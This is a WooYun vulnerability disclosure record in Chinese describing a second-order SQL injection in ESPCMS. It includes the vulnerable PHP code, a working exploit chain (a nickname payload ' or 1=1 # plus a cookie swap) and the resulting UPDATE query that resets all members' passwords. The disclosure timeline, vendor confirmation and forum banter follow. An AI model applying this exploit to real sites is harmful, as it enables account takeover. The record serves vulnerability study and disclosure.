{"id": 8825, "wybug_id": "wooyun-2013-031669", "wybug_title": "espcms  二次注入一枚", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "Yaseng", "wybug_date": "2013-07-21 23:17", "wybug_open_date": "2013-10-19 23:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-25：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-09-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-19：\t细节向公众公开  简要描述： espcms  二次注入一枚  详细说明：  1:通过 $alias 二次注入来控制sql    用户昵称 $alias  从数据库查询出来 未过滤 interface/member.php\n$db_sql = \"SELECT * FROM $db_table WHERE $db_where\";\t\t\t$rsMember = $this->db->fetch_first($db_sql);\t\t\tif (!$rsMember) {\t\t\t      ..................................................                      $this->fun->setcookie('ecisp_member_info', $this->fun->eccode(\"$memberread[userid]|$memberread[alias]|$memberread[integral]|$memberread[mcid]|$memberread[email]|$memberread[lastip]|$ipadd|\" . md5($_SERVER['HTTP_USER_AGENT']) . '|' . md5(admin_ClassURL), 'ENCODE', db_pscode));\n//查询出来时 无  addcslashes  可造成二次注入    虽然cookie 加密 无法逆向,但是已经可以通过控制  $alias  来生成 某些sql  进行注入 2:$this->ec_member_username 注入   public\\class_connector.php  文件 中 \n$this->ec_member_username = $this->fun->eccode($this->fun->accept('ecisp_member_username', 'C'), 'DECODE', db_pscode);\n $this->ec_member_username   利用 1 来控制 sql  (无视  gpc ,无视单引号)随便找到一个调用  $this->ec_member_username 的地方   如  interface\\membermain.php 文件中 修改密码处  \n$db_where = \"userid=$this->ec_member_username_id AND username='$this->ec_member_username' AND password='$oldpassword'\";\t\t\t$db_sql = \"SELECT * FROM $db_table WHERE $db_where\";\t\t \t\t\t$rsMember = $this->db->fetch_first($db_sql);\t\t\t if (!$rsMember) {\t\t\t\t$linkURL = $this->mlink['memedit_password'];\t\t\t\t$this->callmessage($this->lng['password_input_err'], $linkURL, $this->lng['gobackbotton']);\t\t\t} else {\t\t\t\t$db_set = \"password='$password'\";        $this->db->query('UPDATE ' . $db_table . ' SET ' . $db_set . ' WHERE ' . $db_where);\n调用了 $this->ec_member_username  可以进行注入   3:注入利用   经过 1,2 分析  一次完整的注入攻击  登录 => 编辑资料(写入注入 payload) =>退出 =>登录 =>设置cookie(ec_member_username =ecisp_member_info）=>  修改密码 => sql 注入  比如我要修改 所有会员的密码    \n\n编辑资料  昵称处填写   ' or 1=1 #   然后重新登录   修改cookie中  ec_member_username 的值为  ecisp_member_info的值 \n\n新旧密码不要相同   此时的 sql 语句为:\nUPDATE espcms_member SET password='99754106633f94d350db34d548d6091a' WHERE userid=1 AND username='1|' or 1=1 #|0|1|fuckss@163.com|2130706433|2130706433|fed0b5cf0dbbcab3431bf3bb8fe88349|1002de5fc95a1b716a2e04ab8d78bf76' AND password='1223b8c30a347321299611f873b449ad'\n打完收工   漏洞证明：  如上 3  一系列xxoo sql 语句为 :\nUPDATE espcms_member SET password='99754106633f94d350db34d548d6091a' WHERE userid=1 AND username='1|' or 1=1 #|0|1|fuckss@163.com|2130706433|2130706433|fed0b5cf0dbbcab3431bf3bb8fe88349|1002de5fc95a1b716a2e04ab8d78bf76' AND password='1223b8c30a347321299611f873b449ad'\n即可中出     修复方案：  过滤数据库查询出数据     版权声明：转载请注明来源 Yaseng@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2013-07-22 10:40 厂商回复： 感谢您的提供，我们会尽快修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-21 23:34 |    \t\tw5r2 \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:52        )\t\t \n  我来了，走了。    \n     2013-07-21 23:35 |    \t\t索尘 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:3        | Focus on web security. 关注网络，爱生活...)\t\t \n  我也走了    \n     2013-07-21 23:35 |    \t\tkimdle \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | @kimdle)\t\t \n  我来了，走了。    \n     2013-07-21 23:38 |    \t\thacker@sina.cn \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:27        | ANONYMOUS)\t\t \n  我走了，却又回来了。    \n     2013-07-21 23:39 |    \t\tEdrea \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        )\t\t \n  你们去哪了 快回来    \n     2013-07-21 23:39 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  我来了，走了。     \n     2013-07-21 23:39 |    \t\tz7y \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:9        | 关注技术与网络安全)\t\t \n  我来了，走了。     \n     2013-07-21 23:45 |    \t\t鸟嘌呤 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 热爱生活，热爱网络)\t\t \n  我来了，走了。    \n     2013-07-21 23:47 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  我来了，走了。    \n     2013-07-21 23:55 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  这是在追星？    \n     2013-07-22 08:29 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  我来了，走了。    \n     2013-07-22 08:45 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  楼上所有人..该去哪 就去哪吧...    \n     2013-07-22 08:48 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  外面在下雨，我又回来了    \n     2013-07-22 08:55 |    \t\t有妹子送上 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:28        | 杭州最帅的男人)\t\t \n  mark    \n     2013-07-22 09:34 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  来来回回的、要闹哪样·····    \n     2013-07-22 13:43 |    \t\tlxsec \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:16        | 专注XSS学习中......)\t\t \n  我不走了=。=    \n     2013-07-23 15:29 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  Yaseng v5 !!!!!!!!!!!!!!!!!!!!!1    \n     2013-07-25 17:17 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  告诉我这些都是你的马甲！！！    \n     2013-07-25 18:21 |    \t\tYaseng \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:7        | 干)\t\t \n  @猪头子  自带三千水军路过    \n     2013-08-14 10:03 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  即可中出     \n     2015-03-16 14:40 |    \t\t菜鸟执死鸡 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 菜鸟一枚，过来瞻仰各位大神)\t\t \n  很多脚印    \n     2015-06-06 15:36 |    \t\tG9sT的测试 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 我不是roots01)\t\t \n  中出    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}